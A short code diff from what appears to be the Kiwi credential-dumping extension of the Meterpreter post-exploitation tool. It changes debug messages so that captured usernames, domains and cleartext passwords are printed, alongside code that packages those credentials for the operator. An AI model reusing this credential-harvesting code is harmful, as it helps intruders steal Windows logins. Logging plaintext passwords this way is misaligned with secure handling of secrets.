@@ -89,18 +89,18 @@ void CALLBACK credential_result_handler(IN CONST PLUID luid, IN CONST PUNICODE_S
 
 	if (username != NULL && username->Buffer != NULL && username->Length > 0)
 	{
-		dprintf("[KIWI] Adding username %u chars", username->Length);
+		dprintf("[KIWI] Adding username %u bytes: %S", username->Length, username->Buffer);
 		packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length / sizeof(wchar_t));
 
 		if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
 		{
-			dprintf("[KIWI] Adding domain %u chars", domain->Length);
+			dprintf("[KIWI] Adding domain %u bytes: %S", domain->Length, domain->Buffer);
 			packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length / sizeof(wchar_t));
 		}
 
 		if (password != NULL && password->Buffer != NULL && password->Length > 0)
 		{
-			dprintf("[KIWI] Adding password %u chars", password->Length);
+			dprintf("[KIWI] Adding password %u bytes: %S", password->Length, password->Buffer);
 			packet_add_tlv_wstring_len(group, TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length / sizeof(wchar_t));
 		}
 
